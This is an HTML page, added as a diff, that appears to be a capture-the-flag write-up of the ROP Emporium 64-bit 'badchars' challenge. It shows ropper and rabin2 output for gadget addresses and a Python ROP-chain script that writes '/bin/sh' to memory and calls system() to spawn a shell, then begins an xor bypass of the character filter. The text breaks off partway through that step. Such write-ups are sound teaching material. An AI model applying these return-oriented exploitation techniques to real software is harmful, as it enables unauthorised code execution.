@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+    <sidenav>
+        <ol>
+            <a href="#h2-1">* Challenge Description</a><br>
+            <a href="#h2-2">* What are the bad characters?</a><br>
+            <a href="#h3-1">* Extra Note About Bad Characters</a><br>
+            <br>
+            <a href="#h2-3">badchars Solution</a><br>
+            <a href="#h2-4">1) Find a mov gadget</a><br>
+            <a href="#h2-5">2) Find a pop gadget</a><br>
+            <a href="#h2-6">3) Find a writable region of memory to write to</a><br>
+            <a href="#h2-7">4) Find a pop rdi gadget</a><br>
+            <a href="#h2-8">5) Find the address of system()</a><br>
+            <a href="#h2-9">6) Write exploit script</a><br>
+                &emsp;&emsp;&emsp;<a href="#h2-10">* How to bypass bad character filtering?</a><br>
+            <a href="#h2-11">7) Prep for xor decryption</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-2">7a) Find a pop r14; pop r15 gadget</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-3">7b) Find a suitable xor encrypted version of /bin/sh</a><br>
+            
+            <br>
+            <a href="#h2-12">8) Write Final Exploit</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-4">* Final Script</a><br>
+            <br>
+            <a href="#h2-13">9) Win!</a><br>
+            <br>
+            <a href="#h2-14">* Bonus - Testing the Exploit</a><br>
+        </ol>
+    </sidenav>
+
+    <writeup>
+        <h1><strong>#ROP Emporium - 64bit - badchars</strong></h1>
+        <a href="https://ropemporium.com/challenge/badchars.html">https://ropemporium.com/challenge/badchars.html</a><br>
+        <br>
+        <img alt="images\9-1.png" src="images/9-1.png"><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>Challenge Description</strong></h2><br>
+        Description for <code>badchars</code> on ropemporium:<br>
+            <div class="codebox">
+                An&nbsp;arbitrary&nbsp;write&nbsp;challenge&nbsp;with&nbsp;a&nbsp;twist;&nbsp;certain&nbsp;input&nbsp;characters&nbsp;get&nbsp;mangled&nbsp;before&nbsp;finding&nbsp;their&nbsp;way&nbsp;onto&nbsp;the&nbsp;stack.&nbsp;Find&nbsp;a&nbsp;way&nbsp;to&nbsp;deal&nbsp;with&nbsp;this&nbsp;and&nbsp;craft&nbsp;your&nbsp;exploit.
+            </div>
+        </div><br>
+        <br>
+        Like <code>write4</code>, we have to write a string to memory. The difference is that this time, there's bad character filtering which is preventing us from writing <code>/bin/sh</code> to memory.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>What are the bad characters?</strong></h2><br>
+        You can find the bad characters by running the binary.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;./badchars<br>
+                badchars&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                badchars&nbsp;are:&nbsp;b&nbsp;i&nbsp;c&nbsp;/&nbsp;&lt;space&gt;&nbsp;f&nbsp;n&nbsp;s<br>
+                &gt;&nbsp;hey<br>
+                <br>
+                Exiting
+            </div>
+        </div><br>
+        <br>
+        As printed, the bad characters are - <code>b</code> <code>i</code> <code>c</code> <code>/</code> <code>&lt;space&gt;</code> <code>f</code> <code>n</code> <code>s</code>.<br>
+        I retrieved the hex value of each of the characters from here - <a href="https://www.rapidtables.com/convert/number/ascii-to-hex.html">https://www.rapidtables.com/convert/number/ascii-to-hex.html</a><br>
+        <img alt="images\9-2.png" src="images/9-2.png"><br>
+        <br>
+        The hex values of the bad characters are:<br>
+        <code>62</code> <code>69</code> <code>63</code> <code>2f</code> <code>20</code> <code>66</code> <code>6e</code> <code>73</code><br>
+        Or as 1 string:<br>
+        <code>6269632f20666e73</code><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>*Extra Note About Bad Characters</strong></h3><br>
+        One thing to note about bad characters is that they apply to <em>every single address in your ROP chain/exploit</em>, not just your string.<br>
+        The memory address you write to can't contain any bad characters, the memory addresses of ROP gadgets can't contain any bad characters, your hex format of the strings you're writing can't contain any bad characters. There musn't be any bad characters throughout the whole of your code.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>badchars Solution</strong></h2><br>
+        This solution to <code>badchars</code> is the same as the previous challenges.<br>
+        We have to write a string memory, pop it into RDI and run system().<br>
+        <br>
+        To do all this, we need to find:<br>
+        • a <code>mov [?] ?; ret</code> instruction to move a value from a register into memory<br>
+        • a <code>pop ?; pop ?; ret</code> instruction to pop values into registers<br>
+        • a writable region of memory to write to<br>
+        • a <code>pop rdi; ret</code> instruction to set up parameters for system() call<br>
+        • the address of system()<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>1) Find a mov gadget</strong></h2><br>
+        First, find a <code>mov</code> instruction that writes to a memory address.<br>
+        I'm using <code>ropper</code>, as suggested in the challenge description on ropemporium.com, because it can filter out bad characters.<br>
+        <br>
+        <code>[%]</code> will find <code>mov</code> instructions that move data to addresses pointed to by the register.<br>
+        e.g. <code>mov [r13]</code> will move data into the address pointed to by <code>r13</code>.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;ropper&nbsp;--file&nbsp;badchars&nbsp;--badbytes&nbsp;6269632f20666e73&nbsp;--search&nbsp;"mov&nbsp;[%]"<br>
+                [INFO]&nbsp;Load&nbsp;gadgets&nbsp;from&nbsp;cache<br>
+                [LOAD]&nbsp;loading...&nbsp;100%<br>
+                [LOAD]&nbsp;filtering&nbsp;badbytes...&nbsp;100%<br>
+                [LOAD]&nbsp;removing&nbsp;double&nbsp;gadgets...&nbsp;100%<br>
+                [INFO]&nbsp;Searching&nbsp;for&nbsp;gadgets:&nbsp;mov&nbsp;[%]<br>
+                <br>
+                [INFO]&nbsp;File:&nbsp;badchars<br>
+                0x0000000000400b35:&nbsp;mov&nbsp;dword&nbsp;ptr&nbsp;[rbp],&nbsp;esp;&nbsp;ret;&nbsp;<br>
+                0x0000000000400b34:&nbsp;mov&nbsp;qword&nbsp;ptr&nbsp;[r13],&nbsp;r12;&nbsp;ret;
+            </div>
+        </div><br>
+        <br>
+        <code>mov qword ptr [r13], r12; ret;</code> at <code>0x00400b34</code> looks good, providing we find a <code>pop</code> gadget that lets us pop values into <code>r12</code> and <code>r13</code>.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>2) Find a pop gadget</strong></h2><br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;ropper&nbsp;--file&nbsp;badchars&nbsp;--badbytes&nbsp;6269632f20666e73&nbsp;--search&nbsp;"pop&nbsp;r12"<br>
+                [INFO]&nbsp;Load&nbsp;gadgets&nbsp;from&nbsp;cache<br>
+                [LOAD]&nbsp;loading...&nbsp;100%<br>
+                [LOAD]&nbsp;filtering&nbsp;badbytes...&nbsp;100%<br>
+                [LOAD]&nbsp;removing&nbsp;double&nbsp;gadgets...&nbsp;100%<br>
+                [INFO]&nbsp;Searching&nbsp;for&nbsp;gadgets:&nbsp;pop&nbsp;r12<br>
+                <br>
+                [INFO]&nbsp;File:&nbsp;badchars<br>
+                0x0000000000400bac:&nbsp;pop&nbsp;r12;&nbsp;pop&nbsp;r13;&nbsp;pop&nbsp;r14;&nbsp;pop&nbsp;r15;&nbsp;ret;&nbsp;<br>
+                0x0000000000400b3b:&nbsp;pop&nbsp;r12;&nbsp;pop&nbsp;r13;&nbsp;ret;
+            </div>
+        </div><br>
+        <br>
+        Perfect.<br>
+        <code>pop r12; pop r13; ret;</code> at <code>0x00400b3b</code>: is exactly what we need.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>3) Find a writable region of memory to write to</strong></h2><br>
+        Check the sections of the badchars binary using <code>rabin2</code> to find a suitable address to write to.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;rabin2&nbsp;-S&nbsp;badchars<br>
+                [Sections]<br>
+                Nm&nbsp;Paddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memsz&nbsp;Perms&nbsp;Name<br>
+                00&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;----&nbsp;<br>
+                01&nbsp;0x00000238&nbsp;&nbsp;&nbsp;&nbsp;28&nbsp;0x00400238&nbsp;&nbsp;&nbsp;&nbsp;28&nbsp;-r--&nbsp;.interp<br>
+                ...<br>
+                19&nbsp;0x00000e10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.init_array<br>
+                20&nbsp;0x00000e18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.fini_array<br>
+                21&nbsp;0x00000e20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.jcr<br>
+                22&nbsp;0x00000e28&nbsp;&nbsp;&nbsp;464&nbsp;0x00600e28&nbsp;&nbsp;&nbsp;464&nbsp;-rw-&nbsp;.dynamic<br>
+                23&nbsp;0x00000ff8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600ff8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.got<br>
+                24&nbsp;0x00001000&nbsp;&nbsp;&nbsp;112&nbsp;0x00601000&nbsp;&nbsp;&nbsp;112&nbsp;-rw-&nbsp;.got.plt<br>
+                25&nbsp;0x00001070&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;0x00601070&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;-rw-&nbsp;.data<br>
+                26&nbsp;0x00001080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0x00601080&nbsp;&nbsp;&nbsp;&nbsp;48&nbsp;-rw-&nbsp;.bss<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        At first I used .data - <code>0x00601070</code> - but later on this address will cause bad characters to appear.<br>
+        After I realised this, I used .bss - <code>0x00601080</code> - instead.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>4) Find a pop rdi gadget</strong></h2><br>
+        We need a <code>pop rdi; ret</code> gadget so that we can set up the parameters for system()<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;ropper&nbsp;--file&nbsp;badchars&nbsp;--badbytes&nbsp;6269632f20666e73&nbsp;--search&nbsp;"pop&nbsp;rdi"<br>
+                [INFO]&nbsp;Load&nbsp;gadgets&nbsp;from&nbsp;cache<br>
+                [LOAD]&nbsp;loading...&nbsp;100%<br>
+                [LOAD]&nbsp;filtering&nbsp;badbytes...&nbsp;100%<br>
+                [LOAD]&nbsp;removing&nbsp;double&nbsp;gadgets...&nbsp;100%<br>
+                [INFO]&nbsp;Searching&nbsp;for&nbsp;gadgets:&nbsp;pop&nbsp;rdi<br>
+                <br>
+                [INFO]&nbsp;File:&nbsp;badchars<br>
+                0x0000000000400b39:&nbsp;pop&nbsp;rdi;&nbsp;ret;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        The 1 gadget found is fine, located at <code>0x00400b39</code>.<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>5) Find the address of system()</strong></h2><br>
+        Lastly, we need the address of system() so that we can call it.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;rabin2&nbsp;-i&nbsp;badchars<br>
+                [Imports]<br>
+                Num&nbsp;&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;1&nbsp;0x004006d0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;free<br>
+                &nbsp;&nbsp;&nbsp;2&nbsp;0x004006e0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;puts<br>
+                &nbsp;&nbsp;&nbsp;3&nbsp;0x004006f0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;system<br>
+                &nbsp;&nbsp;&nbsp;4&nbsp;0x00400700&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;printf<br>
+                &nbsp;&nbsp;&nbsp;5&nbsp;0x00400710&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;memset<br>
+                &nbsp;&nbsp;&nbsp;6&nbsp;0x00400720&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;__libc_start_main<br>
+                &nbsp;&nbsp;&nbsp;7&nbsp;0x00400730&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;fgets<br>
+                &nbsp;&nbsp;&nbsp;8&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__<br>
+                &nbsp;&nbsp;&nbsp;9&nbsp;0x00400740&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;memcpy<br>
+                &nbsp;&nbsp;10&nbsp;0x00400750&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;malloc<br>
+                &nbsp;&nbsp;11&nbsp;0x00400760&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;setvbuf<br>
+                &nbsp;&nbsp;12&nbsp;0x00400770&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;exit<br>
+                &nbsp;&nbsp;&nbsp;8&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__
+            </div>
+        </div><br>
+        <br>
+        system() is at <code>0x004006f0</code>.<br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>6) Write exploit script</strong></h2><br>
+        At this point we have everything we need to write our exploit and hit the bad characters error.<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;GADGETS&nbsp;---------</span><br>
+                pop_r12_pop_r13_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400b3b</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;r12;&nbsp;pop&nbsp;r13;&nbsp;ret;</span><br>
+                bss_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00601080</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;.bss&nbsp;-&nbsp;16&nbsp;bytes&nbsp;of&nbsp;writable&nbsp;memory</span><br>
+                mov_r12_into_r13_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400b34</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;mov&nbsp;qword&nbsp;ptr&nbsp;[r13],&nbsp;r12;&nbsp;ret;</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;move&nbsp;value&nbsp;in&nbsp;r12&nbsp;into&nbsp;memory&nbsp;address&nbsp;pointed&nbsp;to&nbsp;by&nbsp;r13</span><br>
+                <br>
+                pop_rdi_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400b39</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;rdi;&nbsp;ret</span><br>
+                system_plt_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x004006f0</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rabin2&nbsp;-i&nbsp;badchars</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;EXPLOIT&nbsp;---------</span><br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP&nbsp;@&nbsp;40&nbsp;bytes</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ROP&nbsp;start&nbsp;-&nbsp;Prep&nbsp;to&nbsp;write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;pop_r12_pop_r13_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"/bin/sh\x00"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh"&nbsp;into&nbsp;R12</span><br>
+                payload&nbsp;+=&nbsp;bss_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;.bss&nbsp;address&nbsp;into&nbsp;R13</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ret&nbsp;1&nbsp;-&nbsp;Write&nbsp;"/bin/sh\x00"&nbsp;to&nbsp;memory</span><br>
+                payload&nbsp;+=&nbsp;mov_r12_into_r13_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;write&nbsp;string&nbsp;to&nbsp;.bss&nbsp;address</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ret&nbsp;2&nbsp;-&nbsp;Prep&nbsp;parameters&nbsp;for&nbsp;system()</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;prep&nbsp;to&nbsp;run&nbsp;system()</span><br>
+                payload&nbsp;+=&nbsp;bss_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/sh"&nbsp;into&nbsp;RDI</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ret&nbsp;3&nbsp;-&nbsp;Run&nbsp;system()</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">5</span><br>
+                <span style="color:#0088ff;font-weight:400">#payload&nbsp;+=&nbsp;system_plt_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run&nbsp;system("/bin/sh")</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        Our <code>/bin/sh\x00</code> string, which will spawn a shell for us using system(), will get popped into r12.<br>
+        <br>
+        However, if you run the binary in gdb and observe the registers at the time of the crash, you'll notice that:<br>
+        <code>/bin/sh\x00</code> has been filtered to <code>0x68ebebebebebeb</code><br>
+        <br>
+        <code>68</code> is <code>h</code> in ASCII. <code>h</code> is the only character in our <code>/bin/sh</code> string that isn't a bad character.<br>
+        All of the bad characters in <code>/bin/sh</code> have been replaced with <code>eb</code>.<br>
+        We need to find a way around this bad character filtering.<br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>How to bypass bad character filtering?</strong></h2><br>
+        If you disassemble the binary and check the <code>usefulGadgets</code> function, you'll find a <code>xor</code> instruction.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;badchars<br>
+                <br>
+                badchars:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file&nbsp;format&nbsp;elf64-x86-64<br>
+                ...<br>
+                0000000000400b30&nbsp;&lt;usefulGadgets&gt;:<br>
+                &nbsp;&nbsp;400b30: 45&nbsp;30&nbsp;37&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[r15],r14b<br>
+                &nbsp;&nbsp;400b33: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;400b34: 4d&nbsp;89&nbsp;65&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[r13+0x0],r12<br>
+                &nbsp;&nbsp;400b38: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;400b39: 5f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;rdi<br>
+                &nbsp;&nbsp;400b3a: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;400b3b: 41&nbsp;5c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r12<br>
+                &nbsp;&nbsp;400b3d: 41&nbsp;5d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r13<br>
+                &nbsp;&nbsp;400b3f: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;400b40: 41&nbsp;5e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r14<br>
+                &nbsp;&nbsp;400b42: 41&nbsp;5f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r15<br>
+                &nbsp;&nbsp;400b44: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;400b45: 66&nbsp;2e&nbsp;0f&nbsp;1f&nbsp;84&nbsp;00&nbsp;00&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;PTR&nbsp;cs:[rax+rax*1+0x0]<br>
+                &nbsp;&nbsp;400b4c: 00&nbsp;00&nbsp;00&nbsp;<br>
+                &nbsp;&nbsp;400b4f: 90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        This <code>xor</code> instruction can be used for encryption and decryption of bytes, and is how we can bypass the bad character filtering.<br>
+        <br>
+        We'll do it by writing a xor encrypted version of <code>/bin/sh\x00</code>, a version where there are no bad characters present, to memory. We'll then decrypt the <code>/bin/sh\x00</code> string after it's been through the bad character filter. We pop our decrypted <code>/bin/sh\x00</code> string into RDI and run system(), which will spawn a shell.<br>
+        <br>
+        The <code>xor</code> gadget is located at <code>0x400b30</code> (as seen in the output above).<br>
+        <code>xor [r15],r14b</code> will xor the bytes pointed to by <code>r15</code> using the key provided in <code>r14</code>.<br>
+        <br>
+        <a id="h2-11" name="h2-11"></a><strong></strong>
+        <h2><strong>7) Prep for xor decryption</strong></h2><br>
+        For the xor decryption part of the exploit, we need to find:<br>
+        • a <code>pop r14; pop r15; ret</code> gadget to prep the registers for xor decryption<br>
+        • an encrypted version of <code>/bin/sh\x00</code> that has no bad characters present<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>7a) Find a pop r14; pop r15 gadget</strong></h3><br>
+        Use ropper again, like we've done before.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/badchars#&nbsp;ropper&nbsp;--file&nbsp;badchars&nbsp;--badbytes&nbsp;6269632f20666e73&nbsp;--search&nbsp;"pop&nbsp;r14"<br>
+                [INFO]&nbsp;Load&nbsp;gadgets&nbsp;from&nbsp;cache<br>
+                [LOAD]&nbsp;loading...&nbsp;100%<br>
+                [LOAD]&nbsp;filtering&nbsp;badbytes...&nbsp;100%<br>
+                [LOAD]&nbsp;removing&nbsp;double&nbsp;gadgets...&nbsp;100%<br>
